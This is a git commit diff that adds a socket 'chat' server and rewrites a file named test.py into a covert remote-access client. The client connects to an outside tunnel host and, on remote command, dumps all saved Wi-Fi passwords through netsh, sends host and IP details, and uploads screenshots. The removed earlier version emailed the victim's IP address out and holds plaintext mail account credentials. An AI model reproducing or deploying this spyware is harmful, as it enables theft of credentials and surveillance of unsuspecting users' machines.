645e5c72f9fc6559e2b6b761637b36dbbed3eda7
Егор <egor40361@gmail.com>
2024-11-27 21:50:03 +0700

    Last

---
+++ Srever.py
@@ -0,0 +1,153 @@
+import socket
+import threading
+import os
+import time
+clients = {}
+client_names = {}
+
+
+
+def handle_client(client_socket):
+  while True:
+    try:
+      #print(client_socket)
+      message = client_socket.recv(1024).decode('utf-8')
+      if message:
+        if client_socket not in client_names:
+          client_names[client_socket] = message
+          #broadcast(f"{client_names[client_socket]} присоединился к чату.", client_socket)
+        else:
+          if message.startswith("you "):
+            formatted_message = f"{client_names[client_socket]} (лично): {message[4:]}"
+            send_private_message(formatted_message, client_socket)
+          if message.startswith("."):
+            if message.startswith(".img"):
+              print("Loading...")
+              file = open(f'{client_names[client_socket]}.png', mode="wb")
+
+
+              size_bytes = client_socket.recv(4)
+              size = int.from_bytes(size_bytes, byteorder='big')
+              print(size)
+
+              received_bytes = 0
+              while received_bytes < size:
+                try:
+                  print(f"{received_bytes} / {size}")
+                  data = client_socket.recv(1024)
+                  if not data:  # Проверка на пустые данные
+                    print(f"Ошибка при получении изображения: Клиент отключился")
+                    break
+
+                  file.write(data)
+                  received_bytes += len(data)
+                except Exception as e:
+                  print(f"Ошибка при получении изображения: {e}")
+                  break
+
+              file.close()
+              print("Complete")
+              os.startfile(f'{client_names[client_socket]}.png')
+            else:
+              print(message[1:])
+          else:
+            print(f"Получено сообщение от {client_names[client_socket]}: {message}")
+            broadcast(f"{client_names[client_socket]}: {message}", client_socket)
+      else:
+        remove(client_socket)
+        break
+    except:
+      continue
+
+def broadcast(message, client_socket):
+  for client in clients.keys():
+    print(client)
+    if client != client_socket:
+      try:
+        client.send(message.encode('utf-8'))
+      except:
+        remove(client)
+
+
+def send_private_message(message, sender_socket):
+  try:
+    if ':' not in message:
+      return
+
+    recipient_info = message.split(':')[1].strip()
+    if not recipient_info:
+      return
+
+    recipient_name = recipient_info.split(' ')[0]
+
+    flag = True
+    for client, name in client_names.items():
+      #print(recipient_name)
+      if recipient_name == '.':
+        return
+      if name == recipient_name:
+        flag = False
+        message = ' '.join([el for el in message.split(" ") if el != f'{name}'])
+        client.send(message.encode('utf-8'))
+        message = message.replace("(лично)", "").strip()
+        print(f"(лично для {name}) от {message}")
+        return
+    if flag:
+      print(f"Пользователь {recipient_name} не найден.")
+      out_mes = f"Пользователь {recipient_name} не найден."
+      sender_socket.send(out_mes.encode('utf-8'))
+
+
+
+  except Exception as e:
+    print(f"Ошибка при отправке личного сообщения: {e}")
+def remove(client_socket):
+  print(f"Клиент {client_names[client_socket]} отключился")
+  if client_socket in clients:
+    del clients[client_socket]
+    if client_socket in client_names:
+      del client_names[client_socket]
+
+def accept_connections(server):
+  count = 1
+  while True:
+    client_socket, addr = server.accept()
+    clients[client_socket] = addr
+
+    name = client_socket.recv(1024).decode('utf-8')
+    name += str(count)
+    count += 1
+    print(f"Подключен {addr} под псевдонимом {name}")
+    client_names[client_socket] = name
+    #broadcast(f"{name} присоединился к чату.", client_socket)
+
+    thread = threading.Thread(target=handle_client, args=(client_socket,))
+    thread.start()
+
+
+def start_server():
+  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  server.bind(('localhost', 9090))
+  server.listen(5)
+  print("Server started")
+
+
+  accept_thread = threading.Thread(target=accept_connections, args=(server,))
+  accept_thread.start()
+
+  while True:
+    message = input()
+    if message.startswith("you "):
+      formatted_message = f"Сервер (лично): {message[4:]}"
+      send_private_message(formatted_message, None)
+    else:
+      broadcast(f"Сервер: {message}", None)
+    if message.lower() == 'exit':
+      break
+
+  for client in clients.keys():
+    client.close()
+  server.close()
+
+
+start_server()
--- test.py
+++ test.py
@@ -1,30 +1,106 @@
 import socket
+import threading
+import subprocess
+import time
+from mss import mss
 from requests import get
-import smtplib as smtp
+import os
 
-# file = open('log.txt', 'w')
+def screen(client_socket):
+    message = ".img"
+    client_socket.send(message.encode('utf-8'))
+    with mss() as sct:
+        sct.shot()
+    image_size = os.path.getsize('monitor-1.png')
+    size_bytes = image_size.to_bytes(4, byteorder='big')
+    client_socket.send(size_bytes)
+    print(size_bytes)
 
-host = socket.gethostname()
-local_ip = socket.gethostbyname(host)
-public_ip = get('http://api.ipify.org').text
+    with open('monitor-1.png', 'rb') as file:
+        while True:
+            data = file.read(1024)
+            if not data:
+                break
+            client_socket.send(data)
+    # client_socket.close()
+    # start_client()
 
-print(f'Host: {host}')
-print(f'Local IP: {local_ip}')
-print(f'Public IP: {public_ip}')
 
-src_mail = 'pecik_228@mail.ru'
-password = 'uuQsFq9RiJMxgRmiwLuD'
+def wifi(client_socket):
+    # Создаем запрос в командной строке netsh wlan show profiles, декодируя его по кодировке в самом ядре
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
+    # Создаем список всех названий всех профилей сети (имена сетей)
+    Ws = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
+    # Для каждого имени...
+    for Wi in Ws:
+        # ...вводим запрос netsh wlan show profile [ИМЯ_Сети] key=clear
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', Wi, 'key=clear']).decode(
+            'cp866').split('\n')
+        # Забираем ключ
+        results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
+        # Пытаемся его вывести в командной строке, отсекая все ошибки
+        try:
+            time.sleep(0.3)
+            message = f'.Имя сети: {Wi}, Пароль: {results[0]}'
+            client_socket.send(message.encode('utf-8'))
+        except IndexError:
+            time.sleep(0.3)
+            message = f'.Имя сети: {Wi}, Пароль: нету'
+            client_socket.send(message.encode('utf-8'))
 
-dest_mail = 'sadtrollface@mail.ru'
-mail_subject = 'IP'
-mail_text = f'Host: {host}\nLocal IP: {local_ip}\nPublic IP: {public_ip}'
+def system(client_socket):
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    public_ip = get('http://api.ipify.org').text
+    message = (f'.Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')
+    client_socket.send(message.encode('utf-8'))
 
-message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(src_mail, dest_mail, 'IP', mail_text)
+def obr(message,client_socket):
+  temp_mes = message.split(": ",1)[1]
+  if temp_mes[:1] == "/":
+    match temp_mes:
+        case "/wifi": wifi(client_socket)
+        case "/system": system(client_socket)
+        case "/screen": screen(client_socket)
+        case _:
+            message = ".Неизвесная команда"
+            client_socket.send(message.encode('utf-8'))
+  elif temp_mes[:1] == ".":
+      receive_messages(client_socket)
+  else:
+    print(message)
 
-server = smtp.SMTP_SSL('smtp.mail.ru')
-server.login(src_mail, password)
-server.auth_plain()
-server.sendmail(src_mail, dest_mail, mail_text)
-server.quit()
+def receive_messages(client_socket):
+  while True:
+    try:
+      message = client_socket.recv(1024).decode('utf-8')
+      if message:
+        obr(message,client_socket)
+      else:
+        break
+    except:
+      print("Ошибка подключения.")
+      break
 
-# file.close()
+def start_client():
+  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  client.connect(('tcp.cloudpub.ru', 35581))
+
+  # name = input("Введите ваше имя: ")
+  name = "Client"
+  client.send(name.encode('utf-8'))
+  # print(f"Теперь вас зовут {name}")
+
+  thread = threading.Thread(target=receive_messages, args=(client,))
+  thread.start()
+
+#  while True:
+#    message = input()
+#    if message.lower() == 'exit':
+#      break
+#    client.send(message.encode('utf-8'))
+
+#  client.close()
+
+if __name__ == "__main__":
+  start_client()
